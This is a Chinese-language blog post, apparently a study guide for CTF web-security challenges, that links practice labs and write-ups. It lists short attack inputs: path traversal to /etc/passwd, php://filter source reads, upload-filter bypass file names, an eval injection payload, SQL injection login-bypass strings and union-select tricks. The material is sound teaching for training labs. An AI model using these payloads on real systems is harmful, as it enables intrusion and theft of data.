-<h3 id="找flag-在请求头，响应头尝试实验室：key究竟在哪里呢？"><a href="#找flag-在请求头，响应头尝试实验室：key究竟在哪里呢？" class="headerlink" title="找flag:在请求头，响应头尝试实验室：key究竟在哪里呢？"></a>找flag:在请求头，响应头尝试<a href="http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php" target="_blank" rel="noopener">实验室：key究竟在哪里呢？</a></h3><h3 id="302跳转的中转网页，burp抓包在HTTP-history中找本应该访问的网站链接-为了方便寻找可以先clear一下历史-简单方法用firefox右键查看元素的查看网络中找到302跳转的网页，寻找flag"><a href="#302跳转的中转网页，burp抓包在HTTP-history中找本应该访问的网站链接-为了方便寻找可以先clear一下历史-简单方法用firefox右键查看元素的查看网络中找到302跳转的网页，寻找flag" class="headerlink" title="302跳转的中转网页，burp抓包在HTTP history中找本应该访问的网站链接(为了方便寻找可以先clear一下历史),简单方法用firefox右键查看元素的查看网络中找到302跳转的网页，寻找flag"></a>302跳转的中转网页，<strong>burp</strong>抓包在HTTP history中找本应该访问的网站链接(为了方便寻找可以先clear一下历史),简单方法用firefox右键查看元素的查看网络中找到302跳转的网页，寻找flag</h3><p><a href="http://chinalover.sinaapp.com/web9/" target="_blank" rel="noopener">南邮：单身一百年也没用</a></p>
-<h3 id="如果题目中遇到只能某某ip才能访问-ip伪造-，修改或添加http请求头的X-Forwarded-For为题目允许的Ip地址-实验室：本地的诱惑"><a href="#如果题目中遇到只能某某ip才能访问-ip伪造-，修改或添加http请求头的X-Forwarded-For为题目允许的Ip地址-实验室：本地的诱惑" class="headerlink" title="如果题目中遇到只能某某ip才能访问(ip伪造)，修改或添加http请求头的X-Forwarded-For为题目允许的Ip地址,实验室：本地的诱惑"></a>如果题目中遇到只能某某ip才能访问(ip伪造)，修改或添加http请求头的<strong>X-Forwarded-For</strong>为题目允许的Ip地址,<a href="http://lab1.xseclab.com/base11_0f8e35973f552d69a02047694c27a8c9/index.php" target="_blank" rel="noopener">实验室：本地的诱惑</a></h3><h3 id="题目中说为了外国人的话：确保Accept-Language中有en-US-没有就自己加，如果说了只为了的话，就删掉其它的语言类型。"><a href="#题目中说为了外国人的话：确保Accept-Language中有en-US-没有就自己加，如果说了只为了的话，就删掉其它的语言类型。" class="headerlink" title="题目中说为了外国人的话：确保Accept-Language中有en-US  没有就自己加，如果说了只为了的话，就删掉其它的语言类型。"></a>题目中说为了外国人的话：确保<strong>Accept-Language</strong>中有en-US  没有就自己加，如果说了只为了的话，就删掉其它的语言类型。</h3><p><a href="http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php" target="_blank" rel="noopener">实验室：种族歧视</a></p>
-<h3 id="只能用某种浏览器访问，直接修改user-agent为对应浏览器名字"><a href="#只能用某种浏览器访问，直接修改user-agent为对应浏览器名字" class="headerlink" title="只能用某种浏览器访问，直接修改user-agent为对应浏览器名字"></a>只能用某种浏览器访问，直接修改<strong>user-agent</strong>为对应浏览器名字</h3><p><a href="http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php" target="_blank" rel="noopener">实验室：HAHA浏览器</a></p>
-<h3 id="Cookie的修改"><a href="#Cookie的修改" class="headerlink" title="Cookie的修改"></a><strong>Cookie</strong>的修改</h3><p><a href="http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php" target="_blank" rel="noopener">实验室：冒充登陆用户</a></p>
-<h3 id="Referer来源伪造"><a href="#Referer来源伪造" class="headerlink" title="Referer来源伪造"></a>Referer来源伪造</h3><p><a href="http://chinalover.sinaapp.com/web22/" target="_blank" rel="noopener">题目</a>这个题好像坏了，可以去看下wp。</p>
-<p><a href="https://blog.csdn.net/qq_39629343/article/details/80697107" target="_blank" rel="noopener">答案</a></p>
-<p> <strong>最后来一个综合的题考察下你学的怎么样</strong><a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="noopener">实验吧：头有点大</a></p>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>利用：</p>
-<h3 id="读取敏感文件：如直接-etc-passwd来读取本地文件内容，其他敏感文件的读取是类似的"><a href="#读取敏感文件：如直接-etc-passwd来读取本地文件内容，其他敏感文件的读取是类似的" class="headerlink" title="读取敏感文件：如直接../../../../../etc/passwd来读取本地文件内容，其他敏感文件的读取是类似的"></a>读取敏感文件：如直接../../../../../etc/passwd来读取本地文件内容，其他敏感文件的读取是类似的</h3><h3 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h3><h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><h3 id="使用PHP封装协议读取文件和写入PHP文件"><a href="#使用PHP封装协议读取文件和写入PHP文件" class="headerlink" title="使用PHP封装协议读取文件和写入PHP文件"></a>使用PHP封装协议读取文件和写入PHP文件</h3><h3 id="配合文件上传漏洞："><a href="#配合文件上传漏洞：" class="headerlink" title="配合文件上传漏洞："></a>配合文件上传漏洞：</h3><p><strong>文件包含建议理解并操作dvwa的前三个难度的这个漏洞</strong><br><strong><br>例题：1.看到url里有?file=xxx.php(文件名)</strong></p>
-<p>考虑php伪协议读取<strong>源码</strong>，</p>
-<p>然后利用这一点，可以读取到你想获取的页面的源码例如：</p>
-<p>index.php，flag.php，login.php的源码,然后base64解密</p>
-<p>url里?后面改成这个?file=php://filter/read=convert.base64-encode/resource=index.php</p>
-<p>本句的意思是将Index.php的源码以base64加密后的形式读出来</p>
-<p><a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">南邮：文件包含</a></p>
-<h2 id="暴力破解：burpsuite暴力破解教程"><a href="#暴力破解：burpsuite暴力破解教程" class="headerlink" title="暴力破解：burpsuite暴力破解教程"></a>暴力破解：<a href="https://t0data.gitbooks.io/burpsuite/content/chapter8.html" target="_blank" rel="noopener">burpsuite暴力破解教程</a></h2><p><a href="http://120.24.86.145:8002/baopo/" target="_blank" rel="noopener">bugku:输入密码查看flag</a></p>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p> <strong>例：只能传jpg等不能传php</strong></p>
-<h3 id="查看网页源码，很清楚看到是前端JS控制的话，那么直接禁用-JavaScript就可以上传php文件了，"><a href="#查看网页源码，很清楚看到是前端JS控制的话，那么直接禁用-JavaScript就可以上传php文件了，" class="headerlink" title="查看网页源码，很清楚看到是前端JS控制的话，那么直接禁用        JavaScript就可以上传php文件了，"></a>查看网页源码，很清楚看到是前端JS控制的话，那么直接禁用        JavaScript就可以上传php文件了，</h3><h3 id="或者可以用burpsuite通过拦截数据包，修改filenmae后文件名后缀为php"><a href="#或者可以用burpsuite通过拦截数据包，修改filenmae后文件名后缀为php" class="headerlink" title="或者可以用burpsuite通过拦截数据包，修改filenmae后文件名后缀为php"></a>或者可以用burpsuite通过拦截数据包，修改filenmae后文件名后缀为php</h3><h3 id="1-jpg-php"><a href="#1-jpg-php" class="headerlink" title="1.jpg.php"></a>1.jpg.php</h3><h3 id="1-php-00-jpg"><a href="#1-php-00-jpg" class="headerlink" title="1.php%00.jpg"></a>1.php%00.jpg</h3><h3 id="1-php-jpg"><a href="#1-php-jpg" class="headerlink" title="1.php;.jpg"></a>1.php;.jpg</h3><h3 id="后缀名修改为php2-php3-php4-php5-phps-pht-phtm-phtml（php的别名）"><a href="#后缀名修改为php2-php3-php4-php5-phps-pht-phtm-phtml（php的别名）" class="headerlink" title="后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名）"></a>后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名）</h3><h3 id="抓包修改Content-Type里的multipart-form-data为Multipart-form-data（大小写绕过）"><a href="#抓包修改Content-Type里的multipart-form-data为Multipart-form-data（大小写绕过）" class="headerlink" title="抓包修改Content_Type里的multipart/form-data为Multipart/form-data（大小写绕过）"></a>抓包修改Content_Type里的multipart/form-data为Multipart/form-data（大小写绕过）</h3><p><a href="http://120.24.86.145:8002/web9/" target="_blank" rel="noopener">bugku:求getshell</a></p>
-<h3 id="上传过后通过显示的路径进行访问，或者右键文件属性里查找。"><a href="#上传过后通过显示的路径进行访问，或者右键文件属性里查找。" class="headerlink" title="上传过后通过显示的路径进行访问，或者右键文件属性里查找。"></a>上传过后通过显示的路径进行访问，或者右键文件属性里查找。</h3><h3 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h3><p><a href="http://118.89.219.210:49166/index.php?file=hello.php" target="_blank" rel="noopener">bugku:文件包含2</a></p>
-<p><a href="https://blog.csdn.net/qq_33417843/article/details/79756682" target="_blank" rel="noopener">答案</a>该题因为结合了上传，所以可以上传一句话木马，然后用菜刀连接</p>
-<p> <strong>文件上传建议理解并操作dvwa的四个难度的这个漏洞</strong></p>
-<h2 id="备份文件类型的-不难"><a href="#备份文件类型的-不难" class="headerlink" title="备份文件类型的(不难)"></a>备份文件类型的(不难)</h2><p>一看到<strong>备份</strong>这两个字就猜到是有文件没有删除，所以加上后缀如.swp .bak .swn .swo测试下 发现是index.php.bak 然后下载文件</p>
-<p><a href="http://120.24.86.145:8002/web16/" target="_blank" rel="noopener">bugku备份是个好习惯</a></p>
-<p><a href="https://blog.csdn.net/qq_40424939/article/details/80646055" target="_blank" rel="noopener">答案</a>该目录可以用御剑扫出来</p>
-<ol>
-<li><p>.bak ：index.php.bak  flag.php.bak等等</p>
-</li>
-<li><p>index.php.swp  index.php.swo    index.vim等等</p>
-</li>
-<li><p>flag.php.swp   flag.php.swo    flag.vim等等</p>
-</li>
-</ol>
-<p>源代码中如果有<meta name="editor" content="Vim">发现是通过vim编写的，一般的vim编写可能会产生遗留问题，就是一个备份文件.swp</p>
-<h2 id="JS类"><a href="#JS类" class="headerlink" title="JS类"></a>JS类</h2><p>尝试禁用js绕过：<a href="http://120.24.86.145:9001/test/" target="_blank" rel="noopener">bugku点击一百万次</a>或者</p>
-<p><a href="https://blog.csdn.net/warmjuhao/article/details/78669230" target="_blank" rel="noopener">此题的另一种解法</a></p>
-<h3 id="js自动刷新"><a href="#js自动刷新" class="headerlink" title="js自动刷新"></a>js自动刷新</h3><p><a href="http://120.24.86.145:8002/web12/" target="_blank" rel="noopener">题目</a></p>
-<p><a href="https://blog.csdn.net/qq_35191331/article/details/77141413" target="_blank" rel="noopener">答案</a></p>
-<h3 id="JS跳转："><a href="#JS跳转：" class="headerlink" title="JS跳转："></a>JS跳转：</h3><p>window.location=”跳转的目标url”;</p>
-<p><a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="noopener">南邮：单身二十年</a></p>
-<h3 id="js加解密"><a href="#js加解密" class="headerlink" title="js加解密"></a>js加解密</h3><p>直接复制粘贴到在F12控制台就出来了</p>
-<h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode:"></a>AAencode:</h3><p><a href="http://chinalover.sinaapp.com/web20/aaencode.txt" target="_blank" rel="noopener">南邮:AAencode</a></p>
-<h3 id="JSFUCK"><a href="#JSFUCK" class="headerlink" title="JSFUCK:"></a>JSFUCK:</h3><p><a href="http://120.24.86.145:8002/web5/" target="_blank" rel="noopener">题目</a></p>
-<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>反射型，储存型，dom型</p>
-<p><a href="https://blog.csdn.net/u011781521/article/details/53894399" target="_blank" rel="noopener">学习资料，讲的通俗易懂</a></p>
-<p><a href="http://103.238.227.13:10089/" target="_blank" rel="noopener">bugku:xss</a></p>
-<p><a href="https://xss.haozi.me/#/0x03" target="_blank" rel="noopener">xss靶场</a></p>
-<h2 id="常见的编码要掌握"><a href="#常见的编码要掌握" class="headerlink" title="常见的编码要掌握"></a>常见的编码要掌握</h2><p>uniocde(<code>&amp;#75;</code>)</p>
-<p>ascii(中文的：<code>\u8fd9</code>)</p>
-<p>base64(<code>YQ==</code>),url(<code>%60</code>)</p>
-<p>UTF-8(中文的：<code>&amp;#x53D1;</code>)</p>
-<p>html实体(<code>&amp;lt;</code>)</p>
-<p>只是举个例子，最好去网上搜一下对应的编码格式然后<strong>认得出来</strong></p>
-<h2 id="代码审计-先理解完bugku的代码审计题"><a href="#代码审计-先理解完bugku的代码审计题" class="headerlink" title="代码审计(先理解完bugku的代码审计题)"></a>代码审计(先理解完bugku的代码审计题)</h2><p>先学下Php的<strong>基础</strong>语法，三个小时不到就学的完，只用看基础语法</p>
-<p>一道好题：<a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="noopener">南邮：/x00</a></p>
-<ol>
-<li><p>找到不懂的函数，去网上查，主要是函数特性的</p>
-</li>
-<li><p>察(返回值啊，不能处理数组的函数处理数组返回null)，以及php语言特性的考察比如弱类型</p>
-</li>
-<li><p>strpos处理数组页数返回null</p>
-</li>
-<li><p>sha1函数处理数组返回null</p>
-</li>
-<li><p>MD5函数处理数组返回null</p>
-</li>
-<li><p>ereg%00截断</p>
-</li>
-<li><p>strpos%00绕过 </p>
-</li>
-<li><p>二次urlencode</p>
-</li>
-<li><p>关于弱类型。三叶草出的PHP的悖论1，2这两个题诠释的很不错</p>
-</li>
-</ol>
-<p><a href="https://www.cnblogs.com/L1B0/p/7762909.html" target="_blank" rel="noopener">答案</a></p>
-<ol start="9">
-<li><p>反序列化(有点复杂，我放后面了)</p>
-</li>
-<li><p>extract变量覆盖<a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank" rel="noopener">南邮：变量覆盖</a></p>
-</li>
-<li><p>$GLOBALS：一个包含了全部变量的全局组合数组。变量的名字就是数组的键</p>
-</li>
-</ol>
-<p><a href="http://120.24.86.145:8004/index1.php" target="_blank" rel="noopener">题目</a></p>
-<p><a href="https://blog.csdn.net/auuuuuuuu/article/details/79616285" target="_blank" rel="noopener">答案讲的很详细，推荐一看</a></p>
-<ol start="8">
-<li>进阶代码审计：<strong>thinkphp3</strong>框架的代码审计题：*</li>
-</ol>
-<p><a href="http://document.thinkphp.cn/manual_3_2.html" target="_blank" rel="noopener">文字教程</a></p>
-<p><a href="http://www.php.cn/course/332.html" target="_blank" rel="noopener">视频教程</a></p>
-<p><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">代码审计小总结</a></p>
-<h3 id="file-get-contents-php-input-的妙用"><a href="#file-get-contents-php-input-的妙用" class="headerlink" title="file_get_contents(php://input)的妙用"></a><code>file_get_contents(php://input)</code>的妙用</h3><p>一个php伪协议，用于读取post的数据，但需要allow_url_include为on的情况下才行。因为php://input相当于读一个远程文件</p>
-<p>file_get_contens(php://input)这样就可以成功突破file_get_contents只能读取文件这个问题</p>
-<p><a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php伪协议学习链接</a></p>
-<p><a href="http://120.24.86.145:8002/web8/" target="_blank" rel="noopener">bugku:web8</a></p>
-<p><a href="https://blog.csdn.net/D_pokemon/article/details/78041170" target="_blank" rel="noopener">答案</a></p>
-<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><h3 id="eval："><a href="#eval：" class="headerlink" title="eval："></a>eval：</h3><h3 id="例题-bugku的本地包含但是题现在坏了：-eval-“var-dump-a-”"><a href="#例题-bugku的本地包含但是题现在坏了：-eval-“var-dump-a-”" class="headerlink" title="例题. bugku的本地包含但是题现在坏了： eval(“var_dump($a);”);"></a>例题. bugku的本地包含但是题现在坏了： eval(“var_dump($a);”);</h3><ol>
-<li><p>a=);print_r(file(“flag.php”) <code>a=file(&quot;flag.php&quot;)最终会变成var_dump(file(&quot;flag.php&quot;))以数组的形式输出文件内容；</code></p>
-</li>
-<li><p>a=);print_r(file(“flag.php”)</p>
-</li>
-<li><p>a=);var_dump(file(“flag.php”)</p>
-</li>
-<li><p>a=);include(@$_POST[‘b’]在POST里php://filter/convert.base64-encode/resource=flag.php     (php：//filter可以用于读取文件源代码)</p>
-</li>
-</ol>
-<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h3 id="assert"><a href="#assert" class="headerlink" title="assert():"></a>assert():</h3><p><a href="http://120.24.86.145:8010/" target="_blank" rel="noopener">bugku过狗一句话</a></p>
-<p><a href="https://blog.csdn.net/qq_19861715/article/details/79384018" target="_blank" rel="noopener">答案</a></p>
-<p> <a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">命令执行分享链接</a></p>
-<p>  <a href="http://pupiles.com/shellcode.html" target="_blank" rel="noopener">分享链接2</a></p>
-<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><a href="https://panda1g1.github.io/2018/05/26/php%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">学习资料</a></p>
-<p><a href="http://ctf5.shiyanbar.com/10/web1/" target="_blank" rel="noopener">实验吧：天网管理系统</a></p>
-<p><a href="http://120.24.86.145:8006/test1/" target="_blank" rel="noopener">welcome to bugkuctf</a></p>
-<p>bugku质量特别高的一个题，综合性很强，涉及到反序列化</p>
-<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>常见注入点：</p>
-<p>1.Get、Post</p>
-<p>2.UA头</p>
-<p>3.referer头</p>
-<p>4.cookie</p>
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/web/sqli/" target="_blank" rel="noopener">学习资料</a></p>
-<p>总结的非常好：<a href="http://ratten.me/2018/05/26/Summary%20of%20SQL%20injection/" target="_blank" rel="noopener">学习资料</a></p>
-<p>非常常见的楼的漏洞，危害也非常大：<strong>内容比较多</strong>，简单的可以用<strong>sqlmap</strong>直接跑出来，建议学习sqlilab的系列教程<a href="http://www.baimaoxueyuan.com/course/index/video/id/54" target="_blank" rel="noopener">白帽学院sqli教程视频</a></p>
-<p><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">实验吧：简单的sql注入</a></p>
-<p><a href="ttp://ctf5.shiyanbar.com/web/index_2.php" target="_blank" rel="noopener">实验吧：简单的sql注入2</a></p>
-<p><a href="http://ctf5.shiyanbar.com/web/index_3.php" target="_blank" rel="noopener">实验吧：简单的sql注入3</a></p>
-<p><a href="https://www.baidu.com/link?url=OJ_Y9U-wIUkqIGpBGEahOtplsUT4LHYg0OyVEkfhxswnawegLB7DmFHcMkZYQRVHkdS2aeMhe_usVJ3_lDGV7Gh8tXfw62GEKyZdN5jj0UC&amp;wd=&amp;eqid=bcde599e00004307000000055b63d5d8" target="_blank" rel="noopener">实验吧三个简单的sql注入题wp</a></p>
-<h3 id="基于联合查询的注入"><a href="#基于联合查询的注入" class="headerlink" title="基于联合查询的注入"></a>基于联合查询的注入</h3><p>比较基础一个注入<a href="http://120.24.86.145:8002/chengjidan/" target="_blank" rel="noopener">bugku:成绩单</a></p>
-<p><strong>宽字节注入</strong></p>
-<p>(数据库编码是gb2312，gbk,两个字节一个字符，可能存在宽字节注入，也就是注入的时候会将’转义成\’，通过输入%df’，转义之后就是%df%5c’，%df%5c这两个字节就会被合并成汉字 運，后面的’就被释放出来了。)：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2" target="_blank" rel="noopener">南邮sql injection 3</a></p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">bugku：报错注入</a></p>
-<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>建议用脚本或者sqlmap<a href="https://blog.csdn.net/pygain/article/details/53086389" target="_blank" rel="noopener">学习资料</a></p>
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p><a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php" target="_blank" rel="noopener">实验吧：who are you</a>综合题，难度中等</p>
-<h3 id="外带通道注入-了解"><a href="#外带通道注入-了解" class="headerlink" title="外带通道注入(了解)"></a>外带通道注入(了解)</h3><p>在进行sql注入攻击的时候我们经常会遇见无回显的情况，那我们就不能进行注入了么？</p>
-<p>其实攻击可能已经成功了，But应用程序未返回任何结果，使你误以为攻击失败。</p>
-<p>一种获取数据的有效方法是使用带外通道</p>
-<p>能够在数据库中执行任意SQL语句后,我们可以利用数据的一些内置功能在数据库与自己的计算机直接建立网络连接,通过它传送从数据库中收集的任何信息</p>
-<p><strong>一般可以提取数据的途径</strong>:</p>
-<p>通过HTTP(S)请求、DNS剖析、文件系统、电子邮件等等</p>
-<p>对于MySQL而言</p>
-<p>同样和文件读写一样，需要secure_file_priv这个全局变量控制的权限，具体见上文中对该变量的介绍。</p>
-<p>利用条件：</p>
-<p>全局变量secure_file_priv = ‘ ‘</p>
-<p>可以用SQL server连接到mysql数据库</p>
-<h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h3><p>order by 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 order 或者 order by 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：</p>
-<p><a href="http://115.159.205.137:8001/" target="_blank" rel="noopener">题目</a></p>
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/web/sqli/" target="_blank" rel="noopener">学习资料</a></p>
-<h3 id="万能登陆-举了一些常见的"><a href="#万能登陆-举了一些常见的" class="headerlink" title="万能登陆(举了一些常见的)"></a>万能登陆(举了一些常见的)</h3><p><strong>用户名和密码一起验证机制：</strong></p>
-<ol>
-<li><p>admin’ or 1=1–+</p>
-</li>
-<li><p>admin’ or ‘1’=’1</p>
-</li>
-<li><p>admin” or 1=1–+</p>
-</li>
-<li><p>admin” or “1”=”1</p>
-</li>
-<li><p>1 or ‘1’=’1’=1</p>
-</li>
-<li><p>1 or ‘1’=’1’ or 1=1</p>
-</li>
-<li><p>‘OR 1=1%00</p>
-</li>
-<li><p>“or 1=1%00</p>
-</li>
-<li><p>‘or ‘1</p>
-</li>
-<li><p>“or “1</p>
-</li>
-<li><p>‘or 1–+</p>
-</li>
-<li><p>“or 1–+</p>
-</li>
-</ol>
-<p><a href="https://blog.csdn.net/tan6600/article/details/46754085" target="_blank" rel="noopener">万能登陆原理及总结</a></p>
-<p><strong>用户名和密码分开验证机制</strong></p>
-<p><strong>密码在服务器端Md5加密后进行对比型</strong>(源代码下面的题中有)：</p>
-<p>绕过方法(用union select 绕过)：</p>
-<p>username中输入：一个不存在的用户名’ union select md5(1)# </p>
-<p>password中输入：1</p>
-<p>原理：服务器验证时，将数据库中该用户名<strong>查询</strong>出的密码和输入的密码进行对比(注意，该题接收密码后又md5加密了一次)，前面用户名一定要输不存在的，让服务器段查询密码时因用户名不存在而为空</p>
-<p>然后用union select MD5(1)构造另一个查询结果：它会返回md5(1)的值，所以<strong>最终查询结果</strong>变成md5(1)</p>
-<p>密码中输入1，因为该题在服务器端会经过md5加密后再与与查询的结果进行对比，MD5(1)=md5(1),成功登陆</p>
-<p><a href="http://ctf5.shiyanbar.com/web/5/index.php" target="_blank" rel="noopener">实验吧：程序逻辑问题</a> 拿去练手，题里有源码，可以看看它的验证机制，再来看上面的讲解</p>
-<p><a href="https://blog.csdn.net/dongyanwen6036/article/details/77768345" target="_blank" rel="noopener">答案讲的挺清楚的</a></p>
-<p>这个题有点难<a href="http://118.89.219.210:49165/login.php" target="_blank" rel="noopener">bugku:login2(SKCTF)</a></p>
-<p><a href="http://www.bugku.com/thread-80-1-1.html" target="_blank" rel="noopener">答案：需要VPS</a></p>
-<p><a href="https://www.cnblogs.com/blili/p/9045280.html" target="_blank" rel="noopener">答案：不用VPS</a></p>
-<h2 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h2><h3 id="PHP源码泄露"><a href="#PHP源码泄露" class="headerlink" title="PHP源码泄露"></a>PHP源码泄露</h3><p>这个要去了解一下,</p>
-<ol>
-<li><p>.hg源码</p>
-</li>
-<li><p>.git源码泄露</p>
-</li>
-<li><p>.DS_Store文件泄露</p>
-</li>
-<li><p>网站备份压缩文件.rar .zip .7z .tar.gz .bak .swp .txt .html</p>
-</li>
-<li><p>SVN导致的文件泄露</p>
-</li>
-<li><p>CVS泄漏</p>
-</li>
-<li><p>等等等等</p>
-</li>
-</ol>
-<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p><a href="https://baike.baidu.com/item/robots%E5%8D%8F%E8%AE%AE/2483797?fr=aladdin&amp;fromid=9518761&amp;fromtitle=robots.txt" target="_blank" rel="noopener">学习资料</a></p>
-<p><a href="http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php" target="_blank" rel="noopener">题目</a></p>
-<p><a href="http://120.24.86.145:8002/web13/" target="_blank" rel="noopener">bugku：考细心</a></p>
-<p> <a href="https://blog.csdn.net/anjiaowangmenghan/article/details/77604207" target="_blank" rel="noopener">答案</a></p>
-<h3 id="seeion与cookie"><a href="#seeion与cookie" class="headerlink" title="seeion与cookie"></a>seeion与cookie</h3><p><strong>同一个session(需要写脚本)</strong></p>
-<p><a href="http://120.24.86.145:8002/web6/" target="_blank" rel="noopener">bugku速度要快</a>一个需要写脚本的题，建议把做过题的脚本都分类保存下来，ctf的时候改一下就行，前提是你看的懂</p>
-<p><strong>Cookie</strong>与 <strong>Session</strong>，一般都会认为这是两个独立完全不同的东西，Session采用的是在服务器端保持状态的方案，而Cookie采用的是在客户端保持状态的方案</p>
-<p>在PHP配置中的默认情况下，Session是用Session ID来确定当前对话所对应的服务器Session，而Session ID是通过Cookie来传递的</p>
-<p><a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="noopener">实验吧：Guess Next Session</a> cookie与session结合考察</p>
-<h3 id="sql约束攻击-好理解-："><a href="#sql约束攻击-好理解-：" class="headerlink" title="sql约束攻击(好理解)："></a>sql约束攻击(好理解)：</h3><p><a href="http://118.89.219.210:49163/" target="_blank" rel="noopener">bugku:login1(SKCTF)</a></p>
-<h2 id="逻辑漏洞-简单"><a href="#逻辑漏洞-简单" class="headerlink" title="逻辑漏洞(简单)"></a>逻辑漏洞(简单)</h2><p><a href="http://nctf.nuptzj.cn/web13/index.php?user1=%59%33%52%6D%64%58%4E%6C%63%67%3D%3D" target="_blank" rel="noopener">南邮：密码重置</a></p>
-<p><a href="https://blog.csdn.net/LANVNAL/article/details/54782320?locationNum=6&amp;fps=1" target="_blank" rel="noopener">答案</a></p>
-<h2 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h2><p>先观察出版本信息，百度或者使用google搜对应版本的漏洞以及exp利用</p>
-<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p><a href="http://120.24.86.145:8002/web10/" target="_blank" rel="noopener">bugku:字符？正则？</a></p>
-<p>看一遍正则表达式教程，记不住没关系，遇到忘了的就去翻手册</p>
-<h2 id="安利"><a href="#安利" class="headerlink" title="安利"></a>安利</h2><p>搭建自己的博客,推荐使用Github+Hexo<a href="https://github.com/limedroid/HexoLearning" target="_blank" rel="noopener">教程</a></p>
-<p>熟练使用markdown编写文档<a href="http://blog.leanote.com/post/freewalk/Markdown-%E8%AF%AD%E6%B3%95%E6%89%8B%E5%86%8C" target="_blank" rel="noopener">教程</a></p>
-<p>使用云笔记(推荐为知笔记,有道云笔记,印象笔记)</p>
-<p><a href="http://ratten.me/" target="_blank" rel="noopener">博客推荐</a></p>
-<p><a href="http://hu3sky.ooo/" target="_blank" rel="noopener">博客推荐</a></p>
-<p>关注：<strong>安全客，github，freebuf</strong>等安全网站，安全大牛的推特等拓宽自己知识面</p>
-<ol>
-<li><p><a href="http://hackinglab.cn/ShowQues.php?type=sqlinject" target="_blank" rel="noopener">网络安全实验室</a>：上面的题特别基础，而且很有对比性，有归类，很适合学习使用。然后就是<strong>南邮</strong>和<strong>bugku</strong></p>
-</li>
-<li><p>dvwa和南邮的题网上有全部题的讲解，bugku也基本上都有。 文中有些题没有wp链接是想锻炼你找资源的能力，而且wp那么多，适合自己的才是最好的</p>
-</li>
-<li><p>学习平台:实验吧，i春秋，白帽学院等等等</p>
-</li>
-<li><p>实在做不了的题就用<strong>御剑</strong>扫下目录。此题算是典型，正面做比较难，但是你用御剑扫描会扫出一个目录flag就在里面</p>
-</li>
-</ol>
-<p><a href="http://120.24.86.145:9002/login.php" target="_blank" rel="noopener">bugku:Trim的日记本</a></p>
-<p>而且扫目录也是将来渗透测试信息收集中比较重要的一步。</p>
-<ol start="5">
-<li><p>基础漏洞学习推荐dvwa，学习的时候尽量亲手操作一遍，动手能力是必须养成的，然后看源码(得简单学习下Php的基础语法)，理解原理，不懂的，网上有针对DVWA很详细的讲解</p>
-</li>
-<li><p>现阶段很多语句不用都背住，写到笔记里，要用的时候拿出来用，多使用几次就记住了。因为出现频率少的，背了也会很快就忘了，用处也不大<strong>但一定要搞懂原理</strong>，才能做到不变应万变</p>
-</li>
-<li><p>要用好搜索引擎，建议用google，这是个好习惯，记不到也没关系，但一定要知道如何搜，最后<strong>多看书，多做题，多总结</strong></p>
-</li>
-</ol>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
